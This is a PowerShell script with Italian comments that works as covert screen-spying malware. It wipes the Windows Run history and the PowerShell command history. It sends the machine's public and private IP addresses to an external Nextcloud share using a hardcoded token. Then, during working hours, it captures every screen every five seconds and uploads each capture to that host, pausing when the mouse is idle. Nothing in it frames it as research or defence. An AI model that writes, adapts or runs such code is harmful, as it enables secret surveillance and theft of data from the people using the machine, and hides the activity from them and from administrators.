$AccessToken = "mwgwxBBRLwxCeGj"

function Nextcloud-Upload {

	[CmdletBinding()]
	param ($SourceFilePath, $AccessToken) 

	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

	$nextcloudUrl = "https://liv.nl.tab.digital/"
	$file = $SourceFilePath
	$fileObject = Get-Item $file

	$headers = @{
		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
		"X-Requested-With"="XMLHttpRequest";
	}

	$webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"

	Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
}

Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# CANCELLA CRONOLOGIA ESEGUI
$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if (Test-Path $regKey) {
    Remove-ItemProperty -Path $regKey -Name '*' -ErrorAction SilentlyContinue
}

# CANCELLA CRONOLOGIA POWERSHELL
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[System.Windows.Forms.SendKeys]::Sendwait('%{F7 2}')

# CREAZIONE FILE IP
$publicIP = Invoke-RestMethod -Uri "https://api.ipify.org?format=text"
$privateIP = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Manual' }).IPAddress

$outputFile = Join-Path $PSScriptRoot "ip.txt"

$ipContent = @"
Indirizzo IP pubblico: $publicIP
Indirizzo IP privato: $privateIP
"@

$ipContent | Out-File -FilePath $outputFile -Encoding UTF8

Nextcloud-Upload -SourceFilePath $outputFile -AccessToken $AccessToken

# CREA SCREEN DELLO SCHERMO
$temp = 0
$p1 = [System.Windows.Forms.Cursor]::Position

while ($true) {
	$now       = Get-Date
    $startTime = Get-Date -Hour 9 -Minute 0 -Second 0
    $endTime   = Get-Date -Hour 18 -Minute 0 -Second 0

	if ($now -ge $startTime -and $now -lt $endTime) {
		# Crea e salva gli screen ogni 5 secondi
		$screens = [Windows.Forms.Screen]::AllScreens

		$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
		$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
		$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
		$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
	
		$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
		$bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
		$graphics = [Drawing.Graphics]::FromImage($bmp)
	
		$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

		$time = (Get-Date).ToString("HH.mm.ss")
		$bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$time.png")
		$graphics.Dispose()
		$bmp.Dispose()
		
		$temp += 5
		Start-Sleep -Seconds 5
		$sourcePath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$time.png"
		Nextcloud-Upload -SourceFilePath $sourcePath -AccessToken $AccessToken
		
		# verifico se il mouse si sta muovendo ogni 10 min
		if ($temp -eq 600) {
			
			$p2 = [System.Windows.Forms.Cursor]::Position
			if ($p1.X -eq $p2.X -and $p1.Y -eq $p2.Y) {
				
				# attendo che vengano rilevati nuovi movimenti del mouse
				$attendi = $true
				while($attendi){
					$p1 = [System.Windows.Forms.Cursor]::Position
					Start-Sleep -Seconds 5
					$p2 = [System.Windows.Forms.Cursor]::Position
					
					if($p1.X -ne $p2.X -or $p1.Y -ne $p2.Y){
						$attendi = $false
						$p1 = [System.Windows.Forms.Cursor]::Position
						$temp = 0
					}
				}
				
			} else {
				$p1 = [System.Windows.Forms.Cursor]::Position
				$temp = 0
			}

		}
	}
}